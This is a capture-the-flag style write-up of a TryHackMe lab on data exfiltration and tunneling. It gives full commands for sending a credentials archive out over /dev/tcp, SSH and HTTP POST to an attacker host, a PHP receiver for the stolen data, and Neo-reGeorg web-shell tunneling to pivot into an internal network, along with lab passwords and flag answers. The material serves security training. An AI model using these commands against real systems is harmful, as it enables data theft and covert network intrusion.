---
An introduction to Data Exfiltration and Tunneling techniques over various protocols.
---

# Data Exfiltration — Writeup

## Overview
### Data Exfiltration — Writeup
### Data Exfiltration — Writeup
![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/13f37019256906248c54c0fca4d34bb3.png)
### Introduction
Welcome to Data Exfiltration
Cybercriminals use various internet attacks against companies for different purposes. In most cases, many of these attacks end in data breaches, where threat actors steal sensitive data to sell it on the dark web or publish it online.
Someone may ask: how does a threat actor transfer stolen data from a company's network to the outside, also known as a data breach, without being detected? The answer varies. There are many techniques that a threat actor can perform, including data exfiltration.
Data exfiltration is a non-traditional approach for copying and transferring data from a compromised to an attacker's machine. The data exfiltration technique is used to emulate the normal network activities, and It relies on network protocols such as DNS, HTTP, SSH, etc. Data Exfiltration over common protocols is challenging to detect and distinguish between legitimate and malicious traffic.
Some protocols are not designed to carry data over them. However, threat actors find ways to abuse these protocols to bypass network-based security products such as a firewall. Using these techniques as a red teamer is essential to avoid being detected.
Learning Objectives
This room introduces the data exfiltration types and showcases the techniques used to transfer data over various protocols.
What is Data exfiltration?
Understand data exfiltration types and how they can be used.
Practice data exfiltration over protocols: Sockets, SSH, ICMP, HTTP(s), and DNS.
Practice C2 communications over various protocols.
Practice establishing Tunneling over DNS and HTTP.
Room Prerequisites
Introductory Networking
Protocols and Servers
DNS in Detail
DNS Manipulation
Using tmux or similar tools! (for multiple sessions on single SSH login)
### Network Infrastructure
Network Infrastructure
For this room, we have built a network to simulate practical scenarios where we can perform data exfiltration and tunneling using various network protocols. The provided VM contains two separated networks with multiple clients. We also have a "JumpBox" machine that accesses both networks. The following diagram shows more information about the network environment used in this room.
Use the network diagram for your reference during the coming tasks for various protocols. We also set up a domain name, thm.com, to make it easier to communicate and connect within the network environment. Check the following table for more information about the domain names and network access used in this room.
Domain Name	IP Address	Network Access
jump.thm.com	192.168.0.133	Net 1 and Net 2
uploader.thm.com	172.20.0.100
Net 1
flag.thm.com
***.**.*.***	Net 1
victim2.thm.com
172.20.0.101
Net 1
web.thm.com
192.168.0.100
Net 2
icmp.thm.com
192.168.0.121
Net 2
victim1.thm.com
192.168.0.101
Net 2
Deploy the VM!
Deploy the provided VM and connect to it via an SSH client by deploying the AttackBox or connecting to the VPN. Use the following credentials to connect to the Jumpbox machine with access to the internal networks.
Machine IP: MACHINE_IP            Username: thm         Password: tryhackme
```text
Connect to the VM via the SSH client

           
			
root@AttackBox$ ssh thm@MACHINE_IP
```
Once you are connected to the Jumpbox machine, you have access to both networks. Check the network infrastructure for more information.
Lab Recommendation
We recommend using the JumpBox and the network environment for most tasks (TCP, SSH, ICMP, DNS) to avoid technical issues with DNS and networking. However, If you prefer to use the AttackBox for the DNS Tunneling task (task 10), you must change the DNS settings of the AttackBox to 10.10.20.177. For more information about changing the DNS for AttackBox, check the DNS configuration (Task 8).
In most cases, we need to use two machines to establish communication. Thus, we need two or more Linux terminals available to complete the task. Therefore, we recommend using the tmux tool for creating multiple sessions over a single SSH login.
Once you've deployed the VM, please wait a few minutes for the VM and the networks to start, then progress to the next task!
### Data Exfiltration
What is Data Exfiltration
Data Exfiltration is the process of taking an unauthorized copy of sensitive data and moving it from the inside of an organization's network to the outside. It is important to note that Data Exfiltration is a post-compromised process where a threat actor has already gained access to a network and performed various activities to get hands on sensitive data. Data Exfiltration often happens at the last stage of the Cyber Kill Chain model, Actions on Objectives.
Data exfiltration is also used to hide an adversary's malicious activities and bypass security products. For example, the DNS exfiltration technique can evade security products, such as a firewall.
Sensitive data can be in various types and forms, and it may contain the following:
Usernames and passwords or any authentication information.
Bank accounts details
Business strategic decisions.
Cryptographic keys.
Employee and personnel information.
Project code data.
How to use Data Exfiltration
There are three primary use case scenarios of data exfiltration, including:
Exfiltrate data
Command and control communications.
Tunneling
Traditional Data Exfiltration
The traditional Data Exfiltration scenario is moving sensitive data out of the organization's network. An attacker can make one or more network requests to transfer the data, depending on the data size and the protocol used. Note that a threat actor does not care about the reply or response to his request. Thus, all traffic will be in one direction, from inside the network to outside. Once the data is stored on the attacker's server, he logs into it and grabs the data.
C2 Communications
Many C2 frameworks provide options to establish a communication channel, including standard and non-traditional protocols to send commands and receive responses from a victim machine. In C2 communications a limited number of requests where an attacker sends a request to execute a command in the victim's machine. Then, the agent's client executes the command and sends a reply with the result over a non-traditional protocol. The communications will go in two directions: into and out of the network.
Tunneling
In the Tunneling scenario, an attacker uses this data exfiltration technique to establish a communication channel between a victim and an attacker's machine. The communication channel acts as a bridge to let the attacker machine access the entire internal network. There will be continuous traffic sent and received while establishing the connection.
In the coming tasks, we will discuss the following techniques and use cases:
Exfiltrate using TCP socket and Base64
Exfiltrate using SSH
Exfiltrate using HTTPS (POST request)
ICMP
DNS
In which case scenario will sending and receiving traffic continue during the connection?
*Tunneling*
In which case scenario will sending and receiving traffic be in one direction?
*Traditional Data Exfiltration*
In the next task, we will be discussing how data exfiltration over the TCP socket works!
### Exfiltration using TCP socket
This task shows how to exfiltrate data over TCP using data encoding. Using the TCP socket is one of the data exfiltration techniques that an attacker may use in a non-secured environment where they know there are no network-based security products. If we are in a well-secured environment, then this kind of exfiltration is not recommended. This exfiltration type is easy to detect because we rely on non-standard protocols.
Besides the TCP socket, we will also use various other techniques, including data encoding and archiving. One of the benefits of this technique is that it encodes the data during transmission and makes it harder to examine.
The following diagram explains how traditional communications over TCP work. If two machines want to communicate, then one of them has to listen and wait for the incoming traffic. It is similar to how two people talk and communicate, where one of them is listening, and the other person is speaking.
The diagram shows that two hosts communicate over TCP on port 1337 in the following steps:
The first machine is listening over TCP on port 1337
The other machine connects to the port specified in step 1. For example, nc 1.2.3.4 1337
The first machine establishes the connection
Finally, the sending and receiving data starts. For example, the attacker sends commands and receives results.
Communication over TCP requires two machines, one victim and one attacker machine, to transfer data. Let's use our network environment to practice sending data over TCP. To establish communication over TCP, we require two machines: the victim1.thm.com machine is the victim and the JumpBox, jump.thm.com, is the attacker's machine.
First, we need to prepare a listener on the JumpBox on a port you specify. In our case, we choose port 8080.

## Exploitation
```text
Listening on port TCP/8080 in the JumpBox

           
			
thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data
Listening on [0.0.0.0] (family 0, port 8080)
```
From the previous command, we used the nc command to receive data on port 8080. Then, once we receive the data, we store it in the /tmp/ directory and call it task4-creds.data as a filename.
Now let's connect to our victim machine that contains the data that needs to be transmitted using the following credential: thm:tryhackme. Note that to connect to the victim1 from the JumpBox, we can use the internal domain name as follows,
```text
Connect to the victim from the JumpBox

           
			
thm@jump-box$ ssh thm@victim1.thm.com
```
We can also connect directly from the AttackBox using port 2022 as follows,
```text
Connect to the victim from the AttackBox

           
			
root@AttackBox$ ssh thm@10.10.20.177 -p 2022
```
We have the required data ready to be transmitted on the victim machine. In this case, we have a sample file with a couple of credentials.
```text
Checking the creds.txt file on the victim machine

           
			
thm@victim1:~$ cat task4/creds.txt
admin:password
Admin:123456
root:toor
```
Now that we have the credential text file, we will use the TCP socket to exfiltrate it. Make sure the listener is running on the JumpBox.
```text
Exfiltrate Data over TCP Socket from the victim machine!

           
			
thm@victim1:$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
0+1 records in
0+1 records out
260 bytes copied, 9.8717e-05 s, 2.6 MB/s
```
Let's break down the previous command and explain it:
We used the tar command to create an archive file with the zcf arguments of the content of the secret directory.
The z is for using gzip to compress the selected folder, the c is for creating a new archive, and the f is for using an archive file.
We then passed the created tar file to the base64 command for converting it to base64 representation.
Then, we passed the result of the base64 command to create and copy a backup file with the dd command using EBCDIC encoding data.
Finally, we redirect the dd command's output to transfer it using the TCP socket on the specified IP and port, which in this case, port 8080.
Note that we used the Base64 and EBCDIC encoding to protect the data during the exfiltration. If someone inspects the traffic, it would be in a non-human readable format and wouldn't reveal the transmitted file type.
Once we hit enter, we should receive the encoded data in the /tmp/ directory.
```text
Checking the received data on the JumpBox 

           
			
thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data
Listening on [0.0.0.0] (family 0, port 8080)
Connection from 192.168.0.101 received!

thm@jump-box$ ls -l /tmp/
-rw-r--r-- 1 root root       240 Apr  8 11:37 task4-creds.data
```
On the JumpBox, we need to convert the received data back to its original status. We will be using the dd tool to convert it back.
```text
Restoring the tar file

           
			
thm@jump-box$ cd /tmp/
thm@jump-box:/tmp/$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
0+1 records in
0+1 records out
260 bytes transferred in 0.000321 secs (810192 bytes/sec)
```
The following is the explanation of the previous command:
We used the dd command to convert the received file to ASCII  representation. We used the task4-creds.data as input to the dd command.
The output of the dd command will be passed to the base64 to decode it using the -d argument.
Finally, we save the output in the task4-creds.tar  file.
Next, we need to use the tar command to unarchive the task4-creds.tar file and check the content as follows,
```text
Uncompressing the tar file

           
			
thm@jump-box$ tar xvf task4-creds.tar
task4/ 
task4/creds.txt
```
Let's break down the previous command and explain it:
We used the tar command to unarchive the file with the xvf arguments.
The x is for extracting the tar file, the v for verbosely listing files, and the f is for using an archive file.
Now let's confirm that we have the same data from the victim machine.
```text
Confirming the received data

           
			
thm@jump-box$ cat task4/creds.txt
admin:password
Admin:123456
root:toor
```
Success! We exfiltrated data from a victim machine to an attacker machine using the TCP socket in this task.
Exfiltration using TCP sockets relies on ____________ protocols!
*non-standard*
Now apply what we discussed to exfiltrate data over the TCP socket! Once you exfiltrate data successfully, hit Completed to move on to the next task!
### Exfiltration using SSH
In this task we will show how to use SSH protocol to exfiltrate data over to an attacking machine. SSH protocol establishes a secure channel to interact and move data between the client and server, so all transmission data is encrypted over the network or the Internet.
To transfer data over the SSH, we can use either the Secure Copy Protocol SCP or the SSH client. Let's assume that we don't have the SCP command available to transfer data over SSH. Thus, we will focus more on the SSH client in this task.
As we mentioned earlier, an attacker needs to control a server, which in this case has an SSH server enabled, to receive the exfiltrated data. Thus, we will be using the AttackBox as our SSH server in this scenario. You can also use the JumpBox since it has an SSH server enabled.
Let's assume that we have gained access to sensitive data that must be transmitted securely.  Let's connect to the victim1 or victim2 machine.
```text
The data that needs to be transferred

           
			
thm@victim1:~$ cat task5/creds.txt
admin:password
Admin:123456
root:toor
```
Let's use the same technique we discussed in the "exfiltration using a TCP socket" task, where we will be using the tar command to archive the data and then transfer it.Let's use the same technique we discussed in the "exfiltration using a TCP socket" task, where we will be using the tar command to archive the data and then transfer it.
```text
Exfiltration data from the victim1 machine

           
			
thm@victim1:$ tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```
Let's break down the previous command and explain it:
We used the tar command the same as the previous task to create an archive file of the task5 directory.
Then we passed the archived file over the ssh. SSH clients provide a way to execute a single command without having a full session.
We passed the command that must be executed in double quotations, "cd /tmp/; tar xpf. In this case, we change the directory and unarchive the passed file.
If we check the attacker machine, we can see that we have successfully transmitted the file.
```text
Checking the received data

           
			
thm@jump-box$ cd /tmp/task5/
thm@jump-box:/tmp/task5$ cat creds.txt
admin:password
Admin:123456
root:toor
```
All packets sent using the Data Exfiltration technique over SSH are encrypted! (T=True/F=False)
*T*
Replicate the steps to transfer data over the SSH client. Once you transfer the file successfully, hit Completed and move on to the next task!
### Exfiltrate using HTTP(S)
Before going further, ensure that you have the fundamental knowledge of network protocols before diving into this task and the upcoming tasks.
This task explains how to use the HTTP/HTTPS protocol to exfiltrate data from a victim to an attacker's machine. As a requirement for this technique, an attacker needs control over a webserver with a server-side programming language installed and enabled. We will show a PHP-based scenario in this task, but it can be implemented in any other programming language, such as python, Golang, NodeJS, etc.
HTTP POST Request
Exfiltration data through the HTTP protocol is one of the best options because it is challenging to detect. It is tough to distinguish between legitimate and malicious HTTP traffic. We will use the POST HTTP method in the data exfiltration, and the reason is with the GET request, all parameters are registered into the log file. While using POST request, it doesn't. The following are some of the POST method benefits:
POST requests are never cached
POST requests do not remain in the browser history
POST requests cannot be bookmarked
POST requests have no restrictions on data length
Let's login to theweb.thm.com machine using thm:tryhackme credentials and inspect the Apache log file with two HTTP requests, one for the GET and the other for the POST, and check what they look like!
```text
Inspecting the Apache log file

           
			
thm@jump-box:~$ ssh thm@web.thm.com
thm@web-thm:~$ sudo cat /var/log/apache2/access.log
[sudo] password for thm:
10.10.198.13 - - [22/Apr/2022:12:03:11 +0100] "GET /example.php?file=dGhtOnRyeWhhY2ttZQo= HTTP/1.1" 200 147 "-" "curl/7.68.0"
10.10.198.13 - - [22/Apr/2022:12:03:25 +0100] "POST /example.php HTTP/1.1" 200 147 "-" "curl/7.68.0"
```
Obviously, the first line is a GET request with a file parameter with exfiltrated data. If you try to decode it using the based64 encoding, you would get the transmitted data, which in this case is thm:tryhackme. While the second request is a POST to example.php, we sent the same base64 data, but it doesn't show what data was transmitted.
The base64 data in your access.log looks different, doesn't it? Decode it to find the Flag for Question 1 below.
In a typical real-world scenario, an attacker controls a web server in the cloud somewhere on the Internet. An agent or command is executed from a compromised machine to send the data outside the compromised machine's network over the Internet into the webserver. Then an attacker can log in to a web server to get the data, as shown in the following figure.
HTTP Data Exfiltration
Based on the attacker configuration, we can set up either HTTP or HTTPS, the encrypted version of HTTP. We also need a PHP page that handles the POST HTTP request sent to the server.
We will be using the HTTP protocol (not the HTTPS) in our scenario. Now let's assume that an attacker controls the web.thm.com server, and sensitive data must be sent from the JumpBox or  victim1.thm.com machine in our Network 2 environment (192.168.0.0/24).
To exfiltrate data over the HTTP protocol, we can apply the following steps:
An attacker sets up a web server with a data handler. In our case, it will be web.thm.com and the contact.php page as a data handler.
A C2 agent or an attacker sends the data. In our case, we will send data using the curl command.
The webserver receives the data and stores it. In our case, the contact.php receives the POST request and stores it into /tmp.
The attacker logs into the webserver to have a copy of the received data.
Let's follow and apply what we discussed in the previous steps. Remember, since we are using the HTTP protocol, the data will be sent in cleartext. However, we will be using other techniques (tar and base64) to change the data's string format so that it wouldn't be in a human-readable format!
First, we prepared a webserver with a data handler for this task. The following code snapshot is of PHP code to handle POST requests via a file parameter and stores the received data in the /tmp directory as http.bs64 file name.
```text
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```
Now from the Jump machine, connect to the victim1.thm.com machine via SSH to exfiltrate the required data over the HTTP protocol. Use the following SSH credentials: thm:tryhackme.
```text
Connecting to Victim1 machine from Jump Box

           
			
thm@jump-box:~$ ssh thm@victim1.thm.com
```
You can also connect to it from AttackBox using port 2022 as follow,
```text
Connecting to Victim1 machine from AttackBox

           
			
thm@attacker$ ssh thm@10.10.20.177 -p 2022
```
The goal is to transfer the folder's content, stored in /home/thm/task6, to another machine over the HTTP protocol.
```text
Checking the Secret folder!

           
			
thm@victim1:~$ ls -l
total 12
drwxr-xr-x 1 root root 4096 Jun 19 19:44 task4
drwxr-xr-x 1 root root 4096 Jun 19 19:44 task5
drwxr-xr-x 1 root root 4096 Jun 19 19:44 task6
drwxr-xr-x 1 root root 4096 Jun 19 19:43 task9
```
Now that we have our data, we will be using the curl command to send an HTTP POST request with the content of the secret folder as follows,
```text
Sending POST data via CURL

           
			
thm@victim1:~$ curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
```
We used the curl command with --data argument to send a POST request via the file parameter. Note that we created an archived file of the secret folder using the tar command. We also converted the output of the tar command into base64 representation.
Next, from the victim1 or JumpBox machine, let's log in to the webserver, web.thm.com, and check the /tmp directory if we have successfully transferred the required data. Use the following SSH credentials in order to login into the web: thm:tryhackme.
```text
Checking the received data

           
			
thm@victim1:~$ ssh thm@web.thm.com 
thm@web:~$ ls -l /tmp/
total 4
-rw-r--r-- 1 www-data www-data 247 Apr 12 16:03 http.bs64
thm@web:~$ cat /tmp/http.bs64
H4sIAAAAAAAAA 3ROw7CMBBFUddZhVcA/sYSHUuJSAoKMLKNYPkkgSriU1kIcU/hGcsuZvTysEtD<
WYua1Ch4P9fRss69dsZ4E6wNTiitlTdC qpTPZxz6ZKUIsVY3v379P6j8j3/8ejzqlyrrDgF3Dr3
On/XLvI3QVshVY1hlv48/64/7I bU5fzJaa 2c5XbazzbTOtvCkxpubbUwIAAAAAAAAAAAAAAAB4
5gZKZxgrACgAAA==
```
Nice! We have received the data, but if you look closely at the http.bs64 file, you can see it is broken base64. This happens due to the URL encoding over the HTTP. The + symbol has been replaced with empty spaces, so let's fix it using the sed command as follows,
```text
Fixing the http.bs64 file!

           
			
thm@web:~$ sudo sed -i 's/ /+/g' /tmp/http.bs64
```
Using the sed command, we replaced the spaces with + characters to make it a valid base64 string!
```text
Restoring the Data

           
			
thm@web:~$ cat /tmp/http.bs64 | base64 -d | tar xvfz -
tmp/task6/
tmp/task6/creds.txt
```
Finally, we decoded the base64 string using the base64 command with -d argument, then we passed the decoded file and unarchived it using the tar command.
HTTPS Communications
In the previous section, we showed how to perform Data Exfiltration over the HTTP protocol which means all transmitted data is in cleartext. One of the benefits of HTTPS is encrypting the transmitted data using SSL keys stored on a server.
If you apply the same technique we showed previously on a web server with SSL enabled, then we can see that all transmitted data will be encrypted. We have set up our private HTTPS server to show what the transmitted data looks like. If you are interested in setting up your own HTTPS server, we suggest visiting the [Digital Ocean website](https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04).
HTTPS traffic in Wireshark
As shown in the screenshot, we captured the network traffic and it seems that all client and server communications on port 443 are encrypted.
HTTP Tunneling
Tunneling over the HTTP protocol technique encapsulates other protocols and sends them back and forth via the HTTP protocol. HTTP tunneling sends and receives many HTTP requests depending on the communication channel!
Before diving into HTTP tunneling details, let's discuss a typical scenario where many internal computers are not reachable from the Internet. For example, in our scenario, the uploader.thm.com server is reachable from the Internet and provides web services to everyone. However, the app.thm.com server runs locally and provides services only for the internal network as shown in the following figure:
In this section, we will create an HTTP tunnel communication channel to pivot into the internal network and communicate with local network devices through HTTP protocol. Let's say that we found a web application that lets us upload an HTTP tunnel agent file to a victim webserver, uploader.thm.com. Once we upload and connect to it, we will be able to communicate with app.thm.com.
For HTTP Tunneling, we will be using a [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) tool to establish a communication channel to access the internal network devices. We have installed the tool in AttackBox, and it can be found in the following location:
```text
Neo-reGeorg Path on AttackBox

           
			
root@AttackBox:/opt/Neo-reGeorg#
```
Next, we need to generate an encrypted client file to upload it to the victim web server as follows,
```text
Generating encrypted Tunneling Clients with a selected password!

           
			
root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm                                                                                                                                                                              

          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version 3.8.0
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$

    [ Github ] https://github.com/L-codes/neoreg

    [+] Mkdir a directory: neoreg_servers
    [+] Create neoreg server files:
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel_compatibility.jsp
       => neoreg_servers/tunnel.jspx
       => neoreg_servers/tunnel_compatibility.jspx
       => neoreg_servers/tunnel.php
```
The previous command generates encrypted Tunneling clients with thm key in the neoreg_servers/ directory. Note that there are various extensions available, including PHP, ASPX, JSP, etc. In our scenario, we will be uploading the tunnel.php file via the uploader machine. To access the uploader machine, you can visit the following URL: http://10.10.20.177/uploader or https://10-10-20-177.p.thmlabs.com/uploader without the need for a VPN.
To upload the PHP file, use admin as the key to let you upload any files into the uploader.thm.com. Once we have uploaded the file, we can access it on the following URL: http://10.10.20.177/uploader/files/tunnel.php.
```text
Creating an HTTP Tunnel

           
			
root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py -k thm -u http://10.10.20.177/uploader/files/tunnel.php
```
We need to use the neoreg.py to connect to the client and provide the key to decrypt the tunneling client. We also need to provide a URL to the PHP file that we uploaded on the uploader machine.
Once it is connected to the tunneling client, we are ready to use the tunnel connection as a proxy binds on our local machine, 127.0.0.1, on port 1080.
For example, if we want to access the app.thm.com, which has an internal IP address 172.20.0.121 on port 80, we can use the curl command with --socks5 argument. We can also use other proxy applications, such as ProxyChains, FoxyProxy, etc., to communicate with the internal network.
```text
Access the app.thm.com machine via the HTTP Tunneling

           
			
root@AttackBox:~$ curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
Welcome to APP Server!
```
The following diagram shows the traffic flow as it goes through the uploader machine and then communicates with the internal network devices, which in this case, is the App machine. Note that if we check the network traffic from the App machine, we see that the source IP address of incoming traffic comes from the uploader machine.
Now replicate the HTTP Tunneling steps to establish tunneling over the HTTP protocol to communicate with flag.thm.com with 172.20.0.120 as an IP address on port 80. Note that if you access the flag.thm.com website from other machines within the network, you won't get the flag.
```text
┌──(kali㉿kali)-[~]
└─$ ssh thm@10.10.20.177      
The authenticity of host '10.10.20.177 (10.10.20.177)' can't be established.
ED25519 key fingerprint is SHA256:i08OXA9zrCcuYVHBnFaW6CcVCkiN6zaLcGiNmWo2aek.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.20.177' (ED25519) to the list of known hosts.
thm@10.10.20.177's password: 
Permission denied, please try again.
thm@10.10.20.177's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

thm@jump-box:~$ ssh thm@web.thm.com
The authenticity of host 'web.thm.com (192.168.0.100)' can't be established.
ECDSA key fingerprint is SHA256:FgMKfPI3nivK5/C9Uw51xd6zUKwUd/85aCZHG/2q8ko.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'web.thm.com,192.168.0.100' (ECDSA) to the list of known hosts.
thm@web.thm.com's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

thm@web-thm:~$ sudo cat /var/log/apache2/access.log
[sudo] password for thm: 
192.168.0.133 - - [29/Apr/2022:11:41:54 +0100] "GET /example.php?flag=VEhNe0g3N1AtRzM3LTE1LWYwdW42fQo= HTTP/1.1" 200 495 "-" "curl/7.68.0"
192.168.0.133 - - [29/Apr/2022:11:42:14 +0100] "POST /example.php HTTP/1.1" 200 395 "-" "curl/7.68.0"
192.168.0.1 - - [20/Jun/2022:06:18:35 +0100] "GET /test.php HTTP/1.1" 200 195 "-" "curl/7.68.0"

cyberchef THM{H77P-G37-15-f0un6}
```
Check the Apache log file on web.thm.com  and get the flag!
Decode it using Base64
```text
first connect to jump thm then thm web , initiallize neoreg then upload upload.php (all from attackbox) then use curl to get the flag

root@ip-10-10-99-235:/opt/Neo-reGeorg/neoreg_servers# ssh thm@10.10.20.177
The authenticity of host '10.10.20.177 (10.10.20.177)' can't be established.
ECDSA key fingerprint is SHA256:Ks0kFNo7GTsv8uM8bW78FwCCXjvouzDDmATnx1NhbIs.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.20.177' (ECDSA) to the list of known hosts.
thm@10.10.20.177's password: 
